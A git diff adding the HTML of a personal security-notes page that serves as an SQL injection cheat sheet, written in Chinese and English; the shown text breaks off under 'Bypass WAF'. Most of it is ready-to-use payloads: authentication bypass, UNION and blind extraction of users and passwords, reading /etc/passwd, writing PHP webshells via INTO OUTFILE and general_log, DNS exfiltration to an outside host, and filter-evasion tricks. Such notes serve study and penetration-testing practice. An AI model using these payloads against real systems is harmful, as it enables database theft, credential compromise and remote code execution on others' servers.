@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Web_Application_Attack/Misc.html">Web Application Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Web_Application_Attack/SQL_Injection.html">SQL Injection</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 1:03 AM        </span>
+            February 16, 2021 at 1:04 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/120_Web_Application_Attack/070_SQL_Injection.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,2025 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_SQL_Injection">SQL Injection</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_SQL_Injection">SQL Injection</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+<li>
+<p><a href="#page_Reference">Reference</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_cheat_sheet">cheat sheet</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Exploit_Advantage">Exploit Advantage</a></p>
+</li>
+<li>
+<p><a href="#page_Recon">Recon</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Where">Where</a></p>
+</li>
+<li>
+<p><a href="#page_SQL_vulnerable_input_type">SQL vulnerable input type</a></p>
+</li>
+<li>
+<p><a href="#page_Determine_DBMS">Determine DBMS</a></p>
+</li>
+<li>
+<p><a href="#page_Retrieve_Version">Retrieve Version</a></p>
+</li>
+<li>
+<p><a href="#page_Fuzzing">Fuzzing</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tools">tools</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Bypass_Authenticate">Bypass Authenticate</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Payloads">Payloads</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Retrieving_Data">Retrieving Data</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Attack_types">Attack types</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Union_Based_SQLi">Union-Based SQLi</a></p>
+</li>
+<li>
+<p><a href="#page_Error_Based_SQLi">Error-Based SQLi</a></p>
+</li>
+<li>
+<p><a href="#page_Blind_SQLi">Blind SQLi</a></p>
+</li>
+<li>
+<p><a href="#page_Out_of_Band_SQLi">Out-of-Band SQLi</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_MySQL">MySQL</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_section_22"><strong><code>SELECT 欄位名 FROM 庫名.表名 WHERE 條件</code></strong></a></p>
+</li>
+<li>
+<p><a href="#page_Union_Based">Union-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Error_Based">Error-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Blind">Blind</a></p>
+</li>
+<li>
+<p><a href="#page_Out_of_Bnad">Out-of-Bnad</a></p>
+</li>
+<li>
+<p><a href="#page_Other_Knowledges">Other Knowledges</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_MSSQL">MSSQL</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Union_Based-2">Union-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Error_Based-2">Error-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Blind-2">Blind</a></p>
+</li>
+<li>
+<p><a href="#page_Other_Knowledges-2">Other Knowledges</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Oracle">Oracle</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_UNION_Based">UNION-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Error_Based-3">Error-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Blind-3">Blind</a></p>
+</li>
+<li>
+<p><a href="#page_Out_of_band">Out-of-band</a></p>
+</li>
+<li>
+<p><a href="#page_Other_Knowledge">Other Knowledge</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_SQLite">SQLite</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Blind-4">Blind</a></p>
+</li>
+<li>
+<p><a href="#page_Other_Knowledge-2">Other Knowledge</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_PostgreSQL">PostgreSQL</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Union_Based-3">Union-Based</a></p>
+</li>
+<li>
+<p><a href="#page_Blind-5">Blind</a></p>
+</li>
+<li>
+<p><a href="#page_Other_Knowledge-3">Other Knowledge</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Other">Other</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_ORM_injection">ORM injection</a></p>
+</li>
+<li>
+<p><a href="#page_SQL_Injection_with_MD5">SQL Injection with MD5</a></p>
+</li>
+<li>
+<p><a href="#page_HTTP_Parameter_Pollution">HTTP Parameter Pollution</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_TEMP">TEMP</a></p>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<h2 id="page_Reference">Reference</h2>
+<ul>
+<li>
+<a href="https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html" class="Link--external" rel="noopener noreferrer">⭐手動測試入門 | sushant747 OSCP guide</a>
+</li>
+<li>
+<a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" class="Link--external" rel="noopener noreferrer">pentestmonkey - SQL Injection Cheat Sheet</a>
+</li>
+<li>
+<a href="https://github.com/Audi-1/sqli-labs" class="Link--external" rel="noopener noreferrer">Sqli-labs</a>
+</li>
+</ul>
+<h3 id="page_cheat_sheet">cheat sheet</h3>
+<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" class="Link--external" rel="noopener noreferrer">portswigger</a>
+<a href="https://portswigger.net/training" class="Link--external" rel="noopener noreferrer">portswigger training list</a></p>
+<h2 id="page_Exploit_Advantage">Exploit Advantage</h2>
+<ul>
+<li>繞過驗證</li>
+<li>撈資料庫內容</li>
+<li>取得系統權限 (讀檔、RCE)</li>
+</ul>
+<h2 id="page_Recon">Recon</h2>
+<h3 id="page_Where">Where</h3>
+<ul>
+<li>Cookie</li>
+<li>Get Parameter</li>
+<li>Post Parameter</li>
+</ul>
+<h3 id="page_SQL_vulnerable_input_type">SQL vulnerable input type</h3>
+<ul>
+<li>Numeric： <code>id=123</code>
+<ul>
+<li>
+<code>id=123*1</code> 輸出不變</li>
+<li>
+<code>id=123/0</code> 輸出改變</li>
+<li>
+<code>id=123 and 2=2</code> 輸出不變</li>
+<li>
+<code>id=123 and 2=3</code> 輸出改變</li>
+</ul>
+</li>
+<li>Text： <code>id=admin</code>
+<ul>
+<li>
+<code>id=admin'</code> 引號不匹配 輸出改變</li>
+<li>
+<code>id=admin'%2b'</code> 字串相加 輸出不變</li>
+<li>
+<code>id=admin' and '1'='1</code> 輸出不變</li>
+<li>
+<code>id=admin' and '1'='2</code> 輸出改變</li>
+</ul>
+</li>
+<li>Numeric Input</li>
+</ul>
+<pre><code>MySQL numeric function example: POW(1,1)
+Oracle numeric function example: BITAND(1,1)
+SQL Server numeric function example: SQUARE(1)
+</code></pre>
+<ul>
+<li>Text Input</li>
+</ul>
+<pre><code>MySQL concatenation example: 'abc' 'def'
+Oracle concatenation example: 'abc' || 'def'
+SQL Server concatenation example: 'abc' + 'def'
+</code></pre>
+<h3 id="page_Determine_DBMS">Determine DBMS</h3>
+<ul>
+<li>
+<a href="https://portswigger.net/web-security/sql-injection/examining-the-database" class="Link--external" rel="noopener noreferrer">PortSwigger - Examining the database</a>
+</li>
+<li>
+<a href="http://www.sqlinjection.net/database-fingerprinting/" class="Link--external" rel="noopener noreferrer">sqlinjection</a>
+</li>
+</ul>
+<h3 id="page_Retrieve_Version">Retrieve Version</h3>
+<p><code>' UNION SELECT @@version-- </code></p>
+<ul>
+<li>MySQL: <code>SELECT @@version</code>
+</li>
+<li>Microsoft: <code>SELECT @@version</code>
+</li>
+<li>Oracle:
+<ul>
+<li>
+<code>SELECT banner FROM v$version WHERE rownum=1</code>
+</li>
+<li>
+<code>SELECT banner FROM v$version</code>
+</li>
+<li>
+<code>SELECT version FROM v$instance</code>
+</li>
+</ul>
+</li>
+<li>PostgreSQL: <code>SELECT version()</code>
+</li>
+</ul>
+<h3 id="page_Fuzzing">Fuzzing</h3>
+<h4 id="page_tools">tools</h4>
+<ul>
+<li>
+<a href="https://github.com/xmendez/wfuzz" class="Link--external" rel="noopener noreferrer">wfuzz</a>
+</li>
+</ul>
+<pre><code>wfuzz -u http://logger.htb/room.php?cod=1FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt --hc 404 # hide code 404
+</code></pre>
+<h1 id="page_Bypass_Authenticate">Bypass Authenticate</h1>
+<h2 id="page_Payloads">Payloads</h2>
+<pre><code>' or '1'='1
+</code></pre>
+<h1 id="page_Retrieving_Data">Retrieving Data</h1>
+<h2 id="page_Attack_types">Attack types</h2>
+<h3 id="page_Union_Based_SQLi">Union-Based SQLi</h3>
+<p>合併原本 Query 的資料和想撈的資料，再把原本的 Query 消失 (z.B. 設為不存在的 index -1)，噴出想撈的東西</p>
+<ul>
+<li>
+<a href="https://portswigger.net/web-security/sql-injection/union-attacks" class="Link--external" rel="noopener noreferrer">PortSwigger - UNION attacks</a>
+</li>
+</ul>
+<h3 id="page_Error_Based_SQLi">Error-Based SQLi</h3>
+<p>把要撈的資料放入會噴出來的 Error Log</p>
+<h3 id="page_Blind_SQLi">Blind SQLi</h3>
+<ul>
+<li>
+<a href="https://portswigger.net/web-security/sql-injection/blind" class="Link--external" rel="noopener noreferrer">PortSwigger - Blind SQL injection</a>
+</li>
+</ul>
+<ul>
+<li>Boolean-Based
+輸出可以判斷 True or False ，比對要撈的資料的長度，一個字元一個字元比對</li>
+<li>Time-Based
+輸出不能判斷 T/F ，改用製造時間差來判斷</li>
+</ul>
+<h3 id="page_Out_of_Band_SQLi">Out-of-Band SQLi</h3>
+<p>將資料透過網路外傳</p>
+<h2 id="page_MySQL">MySQL</h2>
+<h4 id="page_section_22"><strong><code>SELECT 欄位名 FROM 庫名.表名 WHERE 條件</code></strong></h4>
+<h3 id="page_Union_Based">Union-Based</h3>
+<p>Goal: <code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p>
+<ul>
+<li>
+<p>Determining the number of columns</p>
+<ul>
+<li>union
+<ul>
+<li>
+<code>' UNION SELECT NULL,NULL-- </code>
+</li>
+<li>
+<code>' UNION SELECT 1,2,3-- </code>
+</li>
+<li>因為 UNION 資料型別必須要一致 UNION 才會成功，所以用 <code>NULL</code> 會是比較好的 (通用)</li>
+<li>註解 <code>-- </code> (有空白) 或是 <code>#</code>
+</li>
+</ul>
+</li>
+<li>order
+<ul>
+<li>
+<code>' ORDER BY 3-- </code> 找最大且沒有錯誤的數字 N</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Finding columns with a useful data type</p>
+<ul>
+<li>通常要 leak 的資料是 <code>string value</code>，試出哪個欄位是 <code>string type</code>
+</li>
+</ul>
+<pre><code>' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+</code></pre>
+</li>
+<li>
+<p>Retrieve interesting data</p>
+<ul>
+<li>
+<code>' UNION SELECT username, password FROM users-- </code>
+<ul>
+<li>The injection point is a quoted string within the WHERE clause.</li>
+<li>The database contains a table called users with the columns username and password.</li>
+</ul>
+</li>
+<li>
+<code>AND 1=2 UNION SELECT 1, 2, password FROM admin-- </code>
+</li>
+</ul>
+</li>
+<li>
+<p>Database contents</p>
+<ul>
+<li>
+<code>SELECT * FROM information_schema.tables</code>
+</li>
+<li>
+<code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+</li>
+</ul>
+<ul>
+<li>
+<code>union select 1,2,schema_name from information_schema.schemata limit 1,1</code> 爆資料庫名</li>
+<li>
+<code>union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1</code> 爆表名</li>
+<li>
+<code>union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1</code> 爆 Column 名</li>
+</ul>
+</li>
+<li>
+<p>MySQL User</p>
+<ul>
+<li>
+<code>SELECT CONCAT(user, &quot;:&quot; ,password) FROM mysql.user;</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Error_Based">Error-Based</h3>
+<ul>
+<li>長度限制
+<ul>
+<li>錯誤訊息有長度限制</li>
+<li>
+<code>#define ERRMSGSIZE (512)</code>
+</li>
+</ul>
+</li>
+<li>Overflow
+<ul>
+<li>MySQL &gt; 5.5.5 overflow才會有錯誤訊息</li>
+<li>
+<code>SELECT ~0</code> =&gt; <code>18446744073709551615</code>
+</li>
+<li>
+<code>SELECT ~0 + 1</code> =&gt; ERROR</li>
+<li>
+<code>SELECT exp(709)</code> =&gt; <code>8.218407461554972e307</code>
+</li>
+<li>
+<code>SELECT exp(710)</code> =&gt; ERROR</li>
+<li>若查詢成功，會返回0
+<ul>
+<li>
+<code>SELECT exp(~(SELECT * FROM (SELECT user())x));</code>
+</li>
+<li>
+<code>ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))'</code>
+</li>
+</ul>
+</li>
+<li>
+<code>select (select(!x-~0)from(select(select user())x)a);</code>
+<ul>
+<li>
+<code>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'</code>
+</li>
+<li>MySQL &gt; 5.5.53 不會顯示查詢結果</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>xpath
+<ul>
+<li>extractvalue (有長度限制，32位)
+<ul>
+<li>
+<code>select extractvalue(1,concat(0x7e,(select @@version),0x7e));</code>
+</li>
+<li>
+<code>ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'</code>
+</li>
+</ul>
+</li>
+<li>updatexml (有長度限制，32位)
+<ul>
+<li>
+<code>select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</code>
+</li>
+<li>
+<code>ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>主鍵重複
+<ul>
+<li>
+<code>select count(*) from test group by concat(version(),floor(rand(0)*2));</code>
+<ul>
+<li>
+<code>ERROR 1062 (23000): Duplicate entry '5.7.171' for key '&lt;group_key&gt;'</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>其它函數 (5.7)
+<ul>
+<li>
+<code>select ST_LatFromGeoHash(version());</code>
+</li>
+<li>
+<code>select ST_LongFromGeoHash(version());</code>
+</li>
+<li>
+<code>select GTID_SUBSET(version(),1);</code>
+</li>
+<li>
+<code>select GTID_SUBTRACT(version(),1);</code>
+</li>
+<li>
+<code>select ST_PointFromGeoHash(version(),1);</code>
+</li>
+</ul>
+</li>
+<li>爆庫名、表名、字段名
+<ul>
+<li>當過濾<code>information_schema</code>等關鍵字時，可以用下面方法爆庫名
+<ul>
+<li>
+<code>select 1,2,3 from users where 1=abc();</code>
+<ul>
+<li>
+<code>ERROR 1305 (42000): FUNCTION fl4g.abc does not exist</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>爆表名
+<ul>
+<li>
+<code>select 1,2,3 from users where Polygon(id);</code>
+</li>
+<li>
+<code>select 1,2,3 from users where linestring(id);</code>
+<ul>
+<li>
+<code>ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>爆Column
+<ul>
+<li>
+<code>select 1,2,3 from users where (select * from  (select * from users as a join users as b)as c);</code>
+<ul>
+<li>
+<code>ERROR 1060 (42S21): Duplicate column name 'id'</code>
+</li>
+</ul>
+</li>
+<li>
+<code>select 1,2,3 from users where (select * from  (select * from users as a join users as b using(id))as c);</code>
+<ul>
+<li>
+<code>ERROR 1060 (42S21): Duplicate column name 'username'</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Blind">Blind</h3>
+<ul>
+<li>Conditional
+<ul>
+<li>
+<code>id=87 and length(user())&gt;0</code>
+</li>
+<li>
+<code>id=87 and length(user())&gt;100</code>
+</li>
+<li>
+<code>id=87 and ascii(mid(user(),1,1))&gt;100</code> 第一個字元</li>
+<li>
+<code>id=87 or ((select user()) regexp binary '^[a-z]')</code> 用正規表達式加速</li>
+</ul>
+</li>
+<li>Conditional Errors
+<ul>
+<li>
+<code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code>
+</li>
+</ul>
+</li>
+<li>Conditional Time Delays
+<ul>
+<li>sleep()
+<ul>
+<li>
+<code>SELECT sleep(10)</code>
+</li>
+</ul>
+</li>
+<li>benchmark()</li>
+<li>Heavy Query</li>
+<li>
+<code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code>
+</li>
+<li>
+<code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code>
+</li>
+<li>
+<code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code>
+</li>
+<li>
+<code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Out_of_Bnad">Out-of-Bnad</h3>
+<ul>
+<li>Windows only</li>
+<li>
+<code>select load_file(concat(&quot;\\\\&quot;,schema_name,&quot;.dns.kaibro.tw/a&quot;)) from information_schema.schemata</code>
+</li>
+</ul>
+<h3 id="page_Other_Knowledges">Other Knowledges</h3>
+<ul>
+<li>
+<p>information_schema
+出現在 mysql &gt;= 5.0</p>
+<ul>
+<li>
+<code>select schema_name from information_schema.schemata</code> 存放資料庫名</li>
+<li>
+<code>select table_name from information_schema.tables</code> 存放表格名</li>
+<li>
+<code>select column_name from information_schema.columns</code> 存放欄位名</li>
+</ul>
+</li>
+<li>
+<p><code>LIMIT N, M</code> 跳過前 N 筆，抓 M 筆
+<img src="https://i.imgur.com/mUvn8bT.png" alt="" /></p>
+</li>
+<li>
+<p>Substring</p>
+<ul>
+<li>
+<code>SUBSTRING(&quot;abc&quot;, 1, 1)</code> =&gt; ‘a’</li>
+<li>
+<code>mid(&quot;abc&quot;, 1, 1)  =&gt; 'a'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Ascii function</p>
+<ul>
+<li>
+<code>ascii('A') =&gt; 65 </code>
+</li>
+</ul>
+</li>
+<li>
+<p>Char function</p>
+<ul>
+<li>
+<code>char(65) =&gt; 'a'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Concatenation 合併字串</p>
+<ul>
+<li>
+<code>CONCAT('a', 'b') =&gt; 'ab'</code>
+<ul>
+<li>如果任何一欄為NULL，則返回NULL</li>
+</ul>
+</li>
+<li>
+<code>CONCAT_WS(分隔符, 字串1, 字串2...)</code>
+<ul>
+<li>
+<code>CONCAT_WS('@', 'gg', 'inin')</code> =&gt; <code>gg@inin</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Cast function</p>
+<ul>
+<li>
+<code>CAST('125e342.83' AS signed) =&gt; 125</code>
+</li>
+<li>
+<code>CONVERT('23',SIGNED) =&gt; 23</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Delay function</p>
+<ul>
+<li>
+<code>sleep(5)</code>
+</li>
+<li>
+<code>BENCHMARK(count, expr)</code>
+</li>
+</ul>
+</li>
+<li>
+<p>空白字元</p>
+<ul>
+<li>
+<code>09 0A 0B 0C 0D A0 20</code>
+</li>
+</ul>
+</li>
+<li>
+<p>File-read function</p>
+<ul>
+<li>
+<code>LOAD_FILE('/etc/passwd')</code>
+</li>
+<li>
+<code>TO_base64(LOAD_FILE(&quot;/var/www/html/room.php&quot;))</code>
+</li>
+</ul>
+</li>
+<li>
+<p>File-write</p>
+<ul>
+<li>
+<code>INTO DUMPFILE</code>
+<ul>
+<li>適用binary (寫入同一行)</li>
+</ul>
+</li>
+<li>
+<code>INTO OUTFILE</code>
+<ul>
+<li>適用一般文本 (有換行)</li>
+</ul>
+</li>
+<li>寫webshell
+<ul>
+<li>需知道可寫路徑</li>
+<li>
+<code>UNION SELECT &quot;&lt;? system($_GET[1]);?&gt;&quot;,2,3 INTO OUTFILE &quot;/var/www/html/temp/shell.php&quot;</code>
+</li>
+</ul>
+</li>
+<li>權限
+<ul>
+<li>
+<code>SELECT file_priv FROM mysql.user</code>
+</li>
+</ul>
+</li>
+<li>secure-file-priv
+<ul>
+<li>限制MySQL導入導出
+<ul>
+<li>load_file, into outfile等</li>
+</ul>
+</li>
+<li>運行時無法更改</li>
+<li>MySQL 5.5.53前，該變數預設為空(可以導入導出)</li>
+<li>e.g. <code>secure_file_priv=E:\</code>
+<ul>
+<li>限制導入導出只能在E:\下</li>
+</ul>
+</li>
+<li>e.g. <code>secure_file_priv=null</code>
+<ul>
+<li>限制不允許導入導出</li>
+</ul>
+</li>
+<li>secure-file-priv限制下用general_log拿shell</li>
+</ul>
+<pre><code>SET global general_log='on';
+
+SET global general_log_file='C:/phpStudy/WWW/cmd.php';
+
+SELECT '&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;';
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>IF語句</p>
+<ul>
+<li>IF(condition,true-part,false-part)</li>
+<li>
+<code>SELECT IF (1=1,'true','false')</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Hex</p>
+<ul>
+<li>
+<code>SELECT X'5061756c';  =&gt;  paul</code>
+</li>
+<li>
+<code>SELECT 0x5061756c; =&gt; paul</code>
+</li>
+<li>
+<code>SELECT 0x5061756c+0 =&gt; 1348564332</code>
+</li>
+<li>
+<code>SELECT load_file(0x2F6574632F706173737764);</code>
+<ul>
+<li>/etc/passwd</li>
+</ul>
+</li>
+<li>可繞過一些WAF
+<ul>
+<li>e.g. 用在不能使用單引號時(<code>'</code> =&gt; <code>\'</code>)</li>
+<li>CHAR()也可以達到類似效果
+<ul>
+<li>
+<code>'admin'</code> =&gt; <code>CHAR(97, 100, 109, 105, 110)</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>註解：</p>
+<ul>
+<li>
+<code>#</code>
+</li>
+<li>
+<code>--</code>
+</li>
+<li>
+<code>/**/</code>
+<ul>
+<li>一個<code>*/</code>可以閉合前面多個<code>/*</code>
+</li>
+</ul>
+</li>
+<li>
+<code>/*! 50001 select * from test */</code>
+<ul>
+<li>可探測版本</li>
+<li>e.g. <code>SELECT /*!32302 1/0, */ 1 FROM tablename</code>
+</li>
+</ul>
+</li>
+<li>`
+<ul>
+<li>MySQL &lt;= 5.5</li>
+</ul>
+</li>
+<li>
+<code>;</code>
+<ul>
+<li>PDO支援多語句</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Stacking Query</p>
+<ul>
+<li>預設PHP+MySQL不支援Stacking Query</li>
+<li>但PDO可以Stacking Query</li>
+</ul>
+</li>
+<li>
+<p>其它：</p>
+<ul>
+<li>@@version
+<ul>
+<li>同version()</li>
+</ul>
+</li>
+<li>user()
+<ul>
+<li>current_user</li>
+<li>current_user()</li>
+<li>current user</li>
+</ul>
+</li>
+<li>system_user()
+<ul>
+<li>database system user</li>
+</ul>
+</li>
+<li>database()
+<ul>
+<li>schema()</li>
+<li>current database</li>
+</ul>
+</li>
+<li>@@basedir
+<ul>
+<li>MySQL安裝路徑</li>
+</ul>
+</li>
+<li>@@datadir
+<ul>
+<li>Location of db file</li>
+</ul>
+</li>
+<li>@@plugin_dir</li>
+<li>@@hostname</li>
+<li>@@version_compile_os
+<ul>
+<li>Operating System</li>
+</ul>
+</li>
+<li>@@version_compile_machine</li>
+<li>@@innodb_version</li>
+<li>MD5()</li>
+<li>SHA1()</li>
+<li>COMPRESS() / UNCOMPRESS()</li>
+<li>group_concat()
+<ul>
+<li>合併多條結果
+<ul>
+<li>e.g. <code>select group_concat(username) from users;</code> 一次返回所有使用者名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>greatest()
+<ul>
+<li>
+<code>greatest(a, b)</code>返回a, b中最大的</li>
+<li>
+<code>greatest(1, 2)=2</code>
+<ul>
+<li>1</li>
+</ul>
+</li>
+<li>
+<code>greatest(1, 2)=1</code>
+<ul>
+<li>0</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>between a and b
+<ul>
+<li>介於a到b之間</li>
+<li>
+<code>greatest(1, 2) between 1 and 3</code>
+<ul>
+<li>1</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>regexp
+<ul>
+<li>
+<code>SELECT 'abc' regexp '.*'</code>
+<ul>
+<li>1</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Collation
+<ul>
+<li>
+<code>*_ci</code> case insensitive collation 不區分大小寫</li>
+<li>
+<code>*_cs</code> case sensitive collation 區分大小寫</li>
+<li>
+<code>*_bin</code> binary case sensitive collation 區分大小寫</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>繞過空白檢查</p>
+<ul>
+<li>
+<code>id=-1/**/UNION/**/SELECT/**/1,2,3</code>
+</li>
+<li>
+<code>id=-1%09UNION%0DSELECT%0A1,2,3</code>
+</li>
+<li>
+<code>id=(-1)UNION(SELECT(1),2,3)</code>
+</li>
+</ul>
+</li>
+<li>
+<p>寬字節注入</p>
+<ul>
+<li>
+<code>addslashes()</code>會讓<code>'</code>變<code>\'</code>
+</li>
+<li>在<code>GBK</code>編碼中，中文字用兩個Bytes表示
+<ul>
+<li>其他多字節編碼也可</li>
+<li>但要低位範圍有包含<code>0x5c</code>(<code>\</code>)</li>
+</ul>
+</li>
+<li>第一個Byte要&gt;128才是中文</li>
+<li>
+<code>%df'</code> =&gt; <code>%df\'</code> =&gt; <code>運'</code> (成功逃逸)</li>
+</ul>
+</li>
+<li>
+<p>Order by注入</p>
+<ul>
+<li>可以透過<code>asc</code>、<code>desc</code>簡單判斷
+<ul>
+<li>
+<code>?sort=1 asc</code>
+</li>
+<li>
+<code>?sort=1 desc</code>
+</li>
+</ul>
+</li>
+<li>後面不能接UNION</li>
+<li>已知字段名 (可以盲注)
+<ul>
+<li>
+<code>?order=IF(1=1, username, password)</code>
+</li>
+</ul>
+</li>
+<li>利用報錯
+<ul>
+<li>
+<code>?order=IF(1=1,1,(select 1 union select 2))</code> 正確</li>
+<li>
+<code>?order=IF(1=2,1,(select 1 union select 2))</code> 錯誤</li>
+<li>
+<code>?order=IF(1=1,1,(select 1 from information_schema.tables))</code> 正常</li>
+<li>
+<code>?order=IF(1=2,1,(select 1 from information_schema.tables))</code> 錯誤</li>
+</ul>
+</li>
+<li>Time Based
+<ul>
+<li>
+<code>?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code> 正常</li>
+<li>
+<code>?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code> sleep 2秒</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>group by with rollup</p>
+<ul>
+<li>
+<code>' or 1=1 group by pwd with rollup limit 1 offset 2#</code>
+</li>
+</ul>
+</li>
+<li>
+<p>將字串轉成純數字</p>
+<ul>
+<li>字串 -&gt; 16進位 -&gt; 10進位</li>
+<li>
+<code>conv(hex(YOUR_DATA), 16, 10)</code>
+</li>
+<li>還原：<code>unhex(conv(DEC_DATA,10,16))</code>
+</li>
+<li>需注意不要Overflow</li>
+</ul>
+</li>
+<li>
+<p>不使用逗號</p>
+<ul>
+<li>
+<code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code>
+</li>
+<li>
+<code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code>
+</li>
+<li>
+<code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code>
+</li>
+</ul>
+</li>
+<li>
+<p>快速查找帶關鍵字的表</p>
+<ul>
+<li>
+<code>select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%'); </code>
+</li>
+</ul>
+</li>
+<li>
+<p>innodb</p>
+<ul>
+<li>表引擎為innodb</li>
+<li>MySQL &gt; 5.5</li>
+<li>innodb_table_stats、innodb_table_index存放所有庫名表名</li>
+<li>
+<code>select table_name from mysql.innodb_table_stats where database_name=資料庫名;</code>
+</li>
+<li>Example: <a href="https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS" class="Link--external" rel="noopener noreferrer">Codegate2018 prequal - simpleCMS</a>
+</li>
+</ul>
+</li>
+<li>
+<p>Bypass WAF</p>
+<ul>
+<li>
